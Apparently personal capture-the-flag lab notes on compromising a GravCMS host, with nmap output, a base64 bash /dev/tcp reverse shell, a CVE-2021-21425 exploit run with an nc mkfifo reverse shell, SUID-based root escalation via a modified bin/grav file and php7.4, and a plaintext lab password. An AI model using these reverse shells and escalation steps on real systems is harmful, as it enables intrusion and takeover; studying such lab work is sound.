____
IP=192.168.179.12
Linux

# Nmap
|PORT|STATE|SERVICE|
|---|---|---|
|22/tcp|open|ssh|
|80/tcp|open|http|
```python

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

## 80 - http

![Captura](../../../../assets/images/reference/fb0cd8175311ea9e473f.png)

### /grav-admin

- CMS = GravCMS

```python
http://192.168.179.12/grav-admin/ [200 OK] Apache[2.4.41], Cookies[grav-site-1dfbe94], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[grav-site-1dfbe94], IP[192.168.179.12], JQuery, MetaGenerator[GravCMS], Script, Title[Home | Grav], X-UA-Compatible[IE=edge]
```

![Captura](../../../../assets/images/reference/342658cae6a2a48fd504.png)

https://www.exploit-db.com/exploits/49973

```bash
echo -ne "bash -i >& /dev/tcp/192.168.45.178/1234 0>&1" | base64 -w0

YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE3OC8xMjM0IDA+JjE=
```


![Captura](../../../../assets/images/reference/39639939aa163cff6bb9.png)


not working

Metasploit works

https://github.com/CsEnox/CVE-2021-21425

```bash
python3 exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.178 5555 >/tmp/f' -t http://192.168.179.12/grav-admin
```
# PrivEsc

## pspy
![Captura](../../../../assets/images/reference/b4c2a9d60ac572b35158.png)

change bin/grav file to :
```php
<?php
// Full path to the bash executable
$bashPath = '/bin/bash';
// Execute chmod 4777 on /bin/bash
chmod($bashPath, 04777);
?>
```

## suid php

```bash
find / -perm -4000 2>/dev/null | grep -v "snap" 

/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
```


# PrivEsc

password --> FatPanda123
